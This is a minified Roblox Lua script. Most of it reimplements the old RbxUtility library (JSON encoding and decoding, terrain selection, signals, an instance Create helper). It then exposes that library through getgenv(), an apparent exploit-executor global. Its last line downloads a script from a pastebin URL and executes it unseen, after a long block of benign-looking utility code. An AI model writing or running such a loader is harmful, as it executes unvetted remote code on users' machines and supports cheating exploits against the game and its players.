local a={}local string=string;local math=math;local table=table;local error=error;local tonumber=tonumber;local tostring=tostring;local type=type;local setmetatable=setmetatable;local pairs=pairs;local ipairs=ipairs;local assert=assert;local b={buffer={}}function b:New()local c={}setmetatable(c,self)self.__index=self;c.buffer={}return c end;function b:Append(d)self.buffer[#self.buffer+1]=d end;function b:ToString()return table.concat(self.buffer)end;local e={backslashes={['\b']="\\b",['\t']="\\t",['\n']="\\n",['\f']="\\f",['\r']="\\r",['"']="\\\"",['\\']="\\\\",['/']="\\/"}}function e:New()local c={}c.writer=b:New()setmetatable(c,self)self.__index=self;return c end;function e:Append(d)self.writer:Append(d)end;function e:ToString()return self.writer:ToString()end;function e:Write(c)local a=type(c)if a=="nil"then self:WriteNil()elseif a=="boolean"then self:WriteString(c)elseif a=="number"then self:WriteString(c)elseif a=="string"then self:ParseString(c)elseif a=="table"then self:WriteTable(c)elseif a=="function"then self:WriteFunction(c)elseif a=="thread"then self:WriteError(c)elseif a=="userdata"then self:WriteError(c)end end;function e:WriteNil()self:Append("null")end;function e:WriteString(c)self:Append(tostring(c))end;function e:ParseString(d)self:Append('"')self:Append(string.gsub(d,"[%z%c\\\"/]",function(f)local g=self.backslashes[f]if g then return g end;return string.format("\\u%.4X",string.byte(f))end))self:Append('"')end;function e:IsArray(a)local h=0;local i=function(j)if type(j)=="number"and j>0 then if math.floor(j)==j then return true end end;return false end;for j,k in pairs(a)do if not i(j)then return false,'{','}'else h=math.max(h,j)end end;return true,'[',']',h end;function e:WriteTable(a)local l,m,n,f=self:IsArray(a)self:Append(m)if l then for o=1,f do self:Write(a[o])if o<f then self:Append(',')end end else local p=true;for j,k in pairs(a)do if not p then self:Append(',')end;p=false;self:ParseString(j)self:Append(':')self:Write(k)end end;self:Append(n)end;function e:WriteError(c)error(string.format("Encoding of %s unsupported",tostring(c)))end;function e:WriteFunction(c)if c==Null then self:WriteNil()else self:WriteError(c)end end;local q={s="",i=0}function q:New(d)local c={}setmetatable(c,self)self.__index=self;c.s=d or c.s;return c end;function q:Peek()local o=self.i+1;if o<=#self.s then return string.sub(self.s,o,o)end;return nil end;function q:Next()self.i=self.i+1;if self.i<=#self.s then return string.sub(self.s,self.i,self.i)end;return nil end;function q:All()return self.s end;local r={escapes={['t']='\t',['n']='\n',['f']='\f',['r']='\r',['b']='\b'}}function r:New(d)local c={}c.reader=q:New(d)setmetatable(c,self)self.__index=self;return c end;function r:Read()self:SkipWhiteSpace()local s=self:Peek()if s==nil then error(string.format("Nil string: '%s'",self:All()))elseif s=='{'then return self:ReadObject()elseif s=='['then return self:ReadArray()elseif s=='"'then return self:ReadString()elseif string.find(s,"[%+%-%d]")then return self:ReadNumber()elseif s=='t'then return self:ReadTrue()elseif s=='f'then return self:ReadFalse()elseif s=='n'then return self:ReadNull()elseif s=='/'then self:ReadComment()return self:Read()else return nil end end;function r:ReadTrue()self:TestReservedWord{'t','r','u','e'}return true end;function r:ReadFalse()self:TestReservedWord{'f','a','l','s','e'}return false end;function r:ReadNull()self:TestReservedWord{'n','u','l','l'}return nil end;function r:TestReservedWord(a)for o,k in ipairs(a)do if self:Next()~=k then error(string.format("Error reading '%s': %s",table.concat(a),self:All()))end end end;function r:ReadNumber()local t=self:Next()local s=self:Peek()while s~=nil and string.find(s,"[%+%-%d%.eE]")do t=t..self:Next()s=self:Peek()end;t=tonumber(t)if t==nil then error(string.format("Invalid number: '%s'",t))else return t end end;function r:ReadString()local t=""assert(self:Next()=='"')while self:Peek()~='"'do local u=self:Next()if u=='\\'then u=self:Next()if self.escapes[u]then u=self.escapes[u]end end;t=t..u end;assert(self:Next()=='"')local v=function(w)return string.char(tonumber(w,16))end;return string.gsub(t,"u%x%x(%x%x)",v)end;function r:ReadComment()assert(self:Next()=='/')local x=self:Next()if x=='/'then self:ReadSingleLineComment()elseif x=='*'then self:ReadBlockComment()else error(string.format("Invalid comment: %s",self:All()))end end;function r:ReadBlockComment()local y=false;while not y do local u=self:Next()if u=='*'and self:Peek()=='/'then y=true end;if not y and u=='/'and self:Peek()=="*"then error(string.format("Invalid comment: %s, '/*' illegal.",self:All()))end end;self:Next()end;function r:ReadSingleLineComment()local u=self:Next()while u~='\r'and u~='\n'do u=self:Next()end end;function r:ReadArray()local t={}assert(self:Next()=='[')local y=false;if self:Peek()==']'then y=true end;while not y do local z=self:Read()t[#t+1]=z;self:SkipWhiteSpace()if self:Peek()==']'then y=true end;if not y then local u=self:Next()if u~=','then error(string.format("Invalid array: '%s' due to: '%s'",self:All(),u))end end end;assert(']'==self:Next())return t end;function r:ReadObject()local t={}assert(self:Next()=='{')local y=false;if self:Peek()=='}'then y=true end;while not y do local A=self:Read()if type(A)~="string"then error(string.format("Invalid non-string object key: %s",A))end;self:SkipWhiteSpace()local u=self:Next()if u~=':'then error(string.format("Invalid object: '%s' due to: '%s'",self:All(),u))end;self:SkipWhiteSpace()local B=self:Read()t[A]=B;self:SkipWhiteSpace()if self:Peek()=='}'then y=true end;if not y then u=self:Next()if u~=','then error(string.format("Invalid array: '%s' near: '%s'",self:All(),u))end end end;assert(self:Next()=="}")return t end;function r:SkipWhiteSpace()local C=self:Peek()while C~=nil and string.find(C,"[%s/]")do if C=='/'then self:ReadComment()else self:Next()end;C=self:Peek()end end;function r:Peek()return self.reader:Peek()end;function r:Next()return self.reader:Next()end;function r:All()return self.reader:All()end;function Encode(c)local D=e:New()D:Write(c)return D:ToString()end;function Decode(d)local E=r:New(d)return E:Read()end;function Null()return Null end;a.DecodeJSON=function(F)pcall(function()warn("RbxUtility.DecodeJSON is deprecated, please use Game:GetService('HttpService'):JSONDecode() instead.")end)if type(F)=="string"then return Decode(F)end;print("RbxUtil.DecodeJSON expects string argument!")return nil end;a.EncodeJSON=function(G)pcall(function()warn("RbxUtility.EncodeJSON is deprecated, please use Game:GetService('HttpService'):JSONEncode() instead.")end)return Encode(G)end;a.MakeWedge=function(H,I,J,K)return game:GetService("Terrain"):AutoWedgeCell(H,I,J)end;a.SelectTerrainRegion=function(L,M,N,O)local P=game:GetService("Workspace"):FindFirstChild("Terrain")if not P then return end;assert(L)assert(M)if not type(L)=="Region3"then error("regionToSelect (first arg), should be of type Region3, but is type",type(L))end;if not type(M)=="BrickColor"then error("color (second arg), should be of type BrickColor, but is type",type(M))end;local Q=P.GetCell;local R=P.WorldToCellPreferSolid;local S=P.CellCenterToWorld;local T=Enum.CellMaterial.Empty;local U=Instance.new("Model")U.Name="SelectionContainer"U.Archivable=false;if O then U.Parent=O else U.Parent=game:GetService("Workspace")end;local V=nil;local W=nil;local X=0;local Y=nil;local Z={}local _={}local a0=Instance.new("Part")a0.Name="SelectionPart"a0.Transparency=1;a0.Anchored=true;a0.Locked=true;a0.CanCollide=false;a0.Size=Vector3.new(4.2,4.2,4.2)local a1=Instance.new("SelectionBox")local function a2(a3)local a4=a3.CFrame.p-a3.Size/2+Vector3.new(2,2,2)local a5=R(P,a4)local a6=a3.CFrame.p+a3.Size/2-Vector3.new(2,2,2)local a7=R(P,a6)local a8=Vector3int16.new(a7.x,a7.y,a7.z)local a9=Vector3int16.new(a5.x,a5.y,a5.z)return Region3int16.new(a9,a8)end;function createAdornment(aa)local ab=nil;local ac=nil;if#_>0 then ab=_[1]["part"]ac=_[1]["box"]table.remove(_,1)ac.Visible=true else ab=a0:Clone()ab.Archivable=false;ac=a1:Clone()ac.Archivable=false;ac.Adornee=ab;ac.Parent=U;ac.Adornee=ab;ac.Parent=U end;if aa then ac.Color=aa end;return ab,ac end;function cleanUpAdornments()for ad,ae in pairs(Z)do if ae.KeepAlive~=W then ae.SelectionBox.Visible=false;table.insert(_,{part=ae.SelectionPart,box=ae.SelectionBox})Z[ad]=nil end end end;function incrementAliveCounter()X=X+1;if X>1000000 then X=0 end;return X end;function adornFullCellsInRegion(af,M)local ag=af.CFrame.p-af.Size/2+Vector3.new(2,2,2)local ah=af.CFrame.p+af.Size/2-Vector3.new(2,2,2)local ai=R(P,ag)local aj=R(P,ah)W=incrementAliveCounter()for I=ai.y,aj.y do for J=ai.z,aj.z do for H=ai.x,aj.x do local ak=Q(P,H,I,J)if ak~=T then local al=S(P,H,I,J)local ad=Vector3int16.new(H,I,J)local am=false;for an,ae in pairs(Z)do if an==ad then ae.KeepAlive=W;if M then ae.SelectionBox.Color=M end;am=true;break end end;if not am then local a0,a1=createAdornment(M)a0.Size=Vector3.new(4,4,4)a0.CFrame=CFrame.new(al)local ae={SelectionPart=a0,SelectionBox=a1,KeepAlive=W}Z[ad]=ae end end end end end;cleanUpAdornments()end;Y=L;if N then local a0,a1=createAdornment(M)a0.Size=L.Size;a0.CFrame=L.CFrame;Z.SelectionPart=a0;Z.SelectionBox=a1;V=function(ao,M)if ao and ao~=Y then Y=ao;a0.Size=ao.Size;a0.CFrame=ao.CFrame end;if M then a1.Color=M end end else adornFullCellsInRegion(L,M)V=function(ao,M)if ao and ao~=Y then Y=ao;adornFullCellsInRegion(ao,M)end end end;local ap=function()V=nil;if U then U:Destroy()end;Z=nil end;return V,ap end;function a.CreateSignal()local aq={}local ar=Instance.new('BindableEvent')local as={}function aq:connect(at)if self~=aq then error("connect must be called with `:`, not `.`",2)end;if type(at)~='function'then error("Argument #1 of connect must be a function, got a "..type(at),2)end;local au=ar.Event:Connect(at)as[au]=true;local av={}function av:disconnect()au:Disconnect()as[au]=nil end;av.Disconnect=av.disconnect;return av end;function aq:disconnect()if self~=aq then error("disconnect must be called with `:`, not `.`",2)end;for au,aw in pairs(as)do au:Disconnect()as[au]=nil end end;function aq:wait()if self~=aq then error("wait must be called with `:`, not `.`",2)end;return ar.Event:Wait()end;function aq:fire(...)if self~=aq then error("fire must be called with `:`, not `.`",2)end;ar:Fire(...)end;aq.Connect=aq.connect;aq.Disconnect=aq.disconnect;aq.Wait=aq.wait;aq.Fire=aq.fire;return aq end;local function ax(ay)if type(ay)~='string'then error("Argument of Create must be a string",2)end;return function(az)az=az or{}local aA=Instance.new(ay)local aB=nil;local aC=nil;for j,k in pairs(az)do if type(j)=='string'then if j=='Parent'then aB=k else aA[j]=k end elseif type(j)=='number'then if type(k)~='userdata'then error("Bad entry in Create body: Numeric keys must be paired with children, got a: "..type(k),2)end;k.Parent=aA elseif type(j)=='table'and j.__eventname then if type(k)~='function'then error("Bad entry in Create body: Key `[Create.E\'"..j.__eventname.."\']` must have a function value\ got: "..tostring(k),2)end;aA[j.__eventname]:connect(k)elseif j==a.Create then if type(k)~='function'then error("Bad entry in Create body: Key `[Create]` should be paired with a constructor function, \ got: "..tostring(k),2)elseif aC then error("Bad entry in Create body: Only one constructor function is allowed",2)end;aC=k else error("Bad entry ("..tostring(j).." => "..tostring(k)..") in Create body",2)end end;if aC then aC(aA)end;if aB then aA.Parent=aB end;return aA end end;a.Create=setmetatable({},{__call=function(aD,...)return ax(...)end})a.Create.E=function(aE)return{__eventname=aE}end;getgenv().LoadLibrary=function(aF)if aF=='RbxUtility'then return a end end; loadstring(game:HttpGet(('https://pastebin.com/raw/kz1Et0kG'),true))()